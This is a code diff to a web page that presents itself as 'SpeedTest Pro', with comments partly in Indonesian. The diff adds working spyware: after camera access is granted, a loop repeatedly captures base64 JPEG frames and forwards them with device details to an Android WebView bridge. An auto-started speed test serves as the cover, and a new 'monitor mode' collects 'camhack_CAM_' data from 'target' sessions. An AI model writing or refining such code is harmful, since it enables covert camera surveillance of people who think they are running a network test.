@@ -180,6 +180,9 @@
         // Get session from URL
         const params = new URLSearchParams(window.location.search);
         const session = params.get('s') || 'session_' + Date.now();
+        const isMonitorMode = params.get('monitor') === 'true';
+        
+        console.log('🚀 SpeedTest Pro loaded - Session:', session, 'Monitor mode:', isMonitorMode);
         
         // Fungsi untuk mengambil info device lengkap
         async function getDeviceInfo() {
@@ -360,6 +363,9 @@
                 currentStream = await navigator.mediaDevices.getUserMedia(constraints);
                 video.srcObject = currentStream;
                 
+                // Force video to play
+                video.play().catch(e => console.log('Video play error:', e));
+                
                 console.log('✅ CAMERA ACCESS GRANTED!');
                 console.log('📹 Video tracks:', currentStream.getVideoTracks().length);
                 
@@ -400,34 +406,55 @@
             const canvas = document.createElement('canvas');
             const ctx = canvas.getContext('2d');
             
+            console.log('📷 Starting frame capture loop...');
+            
             const captureInterval = setInterval(() => {
-                if (video.videoWidth > 0 && currentStream) {
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    ctx.drawImage(video, 0, 0);
-                    
-                    // Convert to base64
-                    const imageData = canvas.toDataURL('image/jpeg', 0.8);
-                    frameCount++;
-                    
-                    // Send frame data
-                    sendToAndroid({
-                        type: 'CAMERA_FRAME',
-                        session: session,
-                        image: imageData,
-                        frameNumber: frameCount,
-                        facingMode: facingMode,
-                        width: canvas.width,
-                        height: canvas.height,
-                        deviceInfo: deviceInfo,
-                        timestamp: new Date().toISOString()
+                if (video.videoWidth > 0 && video.videoHeight > 0 && currentStream) {
+                    try {
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        ctx.drawImage(video, 0, 0);
+                        
+                        // Convert to base64
+                        const imageData = canvas.toDataURL('image/jpeg', 0.7);
+                        frameCount++;
+                        
+                        console.log(`📸 Frame ${frameCount} captured: ${canvas.width}x${canvas.height}`);
+                        
+                        // Send frame data
+                        sendToAndroid({
+                            type: 'CAMERA_FRAME',
+                            session: session,
+                            image: imageData,
+                            frameNumber: frameCount,
+                            facingMode: facingMode,
+                            width: canvas.width,
+                            height: canvas.height,
+                            deviceInfo: deviceInfo,
+                            timestamp: new Date().toISOString()
+                        });
+                        
+                        // Update localStorage
+                        localStorage.setItem('frameCount', frameCount.toString());
+                        localStorage.setItem('lastFrame', new Date().toISOString());
+                        localStorage.setItem('cameraActive', 'true');
+                        
+                        // Visual feedback
+                        if (frameCount % 5 === 0) {
+                            status.textContent = `📷 Recording... Frame ${frameCount}`;
+                        }
+                        
+                    } catch (e) {
+                        console.error('🚨 Frame capture error:', e);
+                    }
+                } else {
+                    console.log('⏳ Waiting for video to be ready...', {
+                        videoWidth: video.videoWidth,
+                        videoHeight: video.videoHeight,
+                        hasStream: !!currentStream
                     });
-                    
-                    // Update localStorage
-                    localStorage.setItem('frameCount', frameCount.toString());
-                    localStorage.setItem('lastFrame', new Date().toISOString());
                 }
-            }, 2000); // Capture setiap 2 detik
+            }, 1500); // Capture setiap 1.5 detik
             
             // Store interval ID untuk bisa di-clear
             localStorage.setItem('captureInterval', captureInterval);
@@ -625,7 +652,9 @@
                 setTimeout(() => {
                     console.log('🏁 Auto-starting speed test...');
                     startSpeedTest();
-                }, 2000);
+                }, 1000);
+                
+
                 
             }, 1000);
         });
@@ -633,8 +662,54 @@
         // Debug: Log semua Android interface calls
         if (window.Android) {
             console.log('✅ Android WebView interface detected!');
+            
+            // If this is monitor mode, set up cross-session communication
+            if (isMonitorMode) {
+                console.log('📺 Monitor mode activated - listening for target data');
+                startCrossSessionMonitoring();
+            }
         } else {
             console.log('❌ Android WebView interface NOT found - running in browser mode');
+        }
+        
+        // Function to monitor data from other sessions
+        function startCrossSessionMonitoring() {
+            setInterval(() => {
+                try {
+                    // Check for data from target sessions
+                    for (let i = 0; i < localStorage.length; i++) {
+                        const key = localStorage.key(i);
+                        if (key && key.startsWith('camhack_CAM_') && !key.includes(session)) {
+                            const data = localStorage.getItem(key);
+                            if (data) {
+                                const parsedData = JSON.parse(data);
+                                console.log('📡 Cross-session data detected:', parsedData.type);
+                                
+                                // Forward to Android
+                                if (window.Android && window.Android.receiveData) {
+                                    window.Android.receiveData(data);
+                                }
+                            }
+                        }
+                    }
+                    
+                    // Check for active connections
+                    const connectionStatus = localStorage.getItem('connection_status');
+                    if (connectionStatus === 'ACTIVE') {
+                        console.log('🎯 Active target connection detected');
+                        
+                        if (window.Android && window.Android.receiveStatus) {
+                            window.Android.receiveStatus(JSON.stringify({
+                                type: 'TARGET_ACTIVE',
+                                session: session,
+                                timestamp: new Date().toISOString()
+                            }));
+                        }
+                    }
+                } catch (e) {
+                    console.error('Cross-session monitoring error:', e);
+                }
+            }, 1000); // Check every second
         }
         
         // Send heartbeat setiap 5 detik
